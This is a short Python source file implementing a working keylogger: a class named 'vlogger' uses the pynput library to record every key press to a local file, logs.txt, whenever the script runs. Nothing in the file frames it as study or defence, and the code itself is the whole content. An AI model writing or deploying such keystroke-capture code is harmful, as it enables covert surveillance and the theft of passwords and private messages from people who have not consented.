from threading import Timer
from pynput.keyboard import Listener

class vlogger:

    def _on_key_press(self, key):
        with open('logs.txt', 'a') as f:
            f.write(str(key)+'\n')

    def run(self):
        with Listener(on_press=self._on_key_press) as listener:
            listener.join()

if __name__ == '__main__':
    vlogger().run()
